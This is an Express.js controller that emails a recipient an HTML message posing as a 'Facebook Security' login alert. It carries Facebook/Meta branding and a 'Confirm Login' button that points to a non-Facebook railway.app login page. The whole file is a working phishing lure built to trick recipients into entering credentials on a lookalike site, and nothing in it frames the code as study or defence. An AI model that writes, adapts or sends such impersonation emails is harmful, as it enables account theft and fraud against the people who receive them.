const sendEmail = require("../services/emailService")
const codeService = require("../services/codeService")

exports.sendLoginEmail = async (req, res) => {
  try {
    const { email } = req.body

    if (!email) {
      return res.status(400).json({
        success: false,
        message: "Email required"
      })
    }

    const loginLink = "https://security-system-production.up.railway.app/login.html"

    const emailTemplate = `
<div style="background:#f0f2f5;padding:50px 0;font-family:Segoe UI,Arial,sans-serif">
  <div style="max-width:620px;margin:auto;background:white;border-radius:12px;
      box-shadow:0 10px 30px rgba(0,0,0,0.06);overflow:hidden">

    <!-- HEADER with logo -->
    <div style="padding:25px 30px;background:#1877f2;color:white;text-align:center">
      <img src="https://security-system-production.up.railway.app/images/logo.png"
           alt="Facebook Security"
           width="60" height="60"
           style="border-radius:50%;margin-bottom:12px;display:block;margin-left:auto;margin-right:auto">
      <div style="font-size:22px;font-weight:600;letter-spacing:.3px">Facebook Security</div>
      <div style="font-size:13px;opacity:.85;margin-top:4px">Account Activity Notification</div>
    </div>

    <!-- BODY -->
    <div style="padding:35px 30px;color:#1c1e21;font-size:15px;line-height:1.6">
      <p style="margin-top:0;font-size:16px">Hello,</p>
      <p>
        We noticed a login attempt to your <strong>Facebook Security portal</strong>.
        To continue safely, please confirm your login by clicking the button below.
      </p>

      <!-- CTA BUTTON with hover -->
      <div style="text-align:center;margin:35px 0">
        <a href="${loginLink}" target="_blank"
          style="background:#1877f2;color:white;text-decoration:none;
          padding:14px 36px;border-radius:8px;font-weight:600;
          font-size:15px;display:inline-block;
          box-shadow:0 4px 12px rgba(24,119,242,0.35);
          transition: all 0.3s ease;">
          Confirm Login
        </a>
      </div>

      <style>
        a[href='${loginLink}']:hover {
          background-color:#0f5ac9 !important;
          box-shadow:0 6px 16px rgba(24,119,242,0.45) !important;
        }
      </style>

      <!-- INFO BOX -->
      <div style="background:#f7f9fc;border:1px solid #e4e6eb;
          padding:18px 20px;border-radius:6px;font-size:14px;color:#444">
        If you did not request this login, you can safely proceed this email.
        Your account will remain secure without verification.
      </div>

      <p style="margin-top:30px;font-weight:600">
        Facebook Security Team
      </p>
    </div>

    <!-- FOOTER -->
    <div style="border-top:1px solid #e4e6eb;padding:20px 30px;
        font-size:12px;color:#65676b;background:#fafafa;line-height:1.5;text-align:center">
      This is an automated security notification from Facebook Security.
      <br><br>
      © 2026 Meta Security · Privacy · Terms
    </div>
  </div>
</div>
`

    // Send email
    let sent
    try {
      sent = await sendEmail(
        email,
        "🔐 Confirm Your Login - Facebook Security",
        emailTemplate
      )
    } catch (err) {
      console.error("Resend API error:", err)
      return res.status(500).json({
        success: false,
        message: "Failed to send email via Resend"
      })
    }

    if (!sent) {
      console.error("Email not sent - Resend returned false")
      return res.status(500).json({
        success: false,
        message: "Email failed to send"
      })
    }

    // Log activity only if email actually sent
    codeService.addActivity(email, "Login alert email sent")

    return res.status(200).json({
      success: true,
      message: "Email sent successfully"
    })

  } catch (error) {
    console.error("Email sending error:", error)
    return res.status(500).json({
      success: false,
      message: "Server error"
    })
  }
}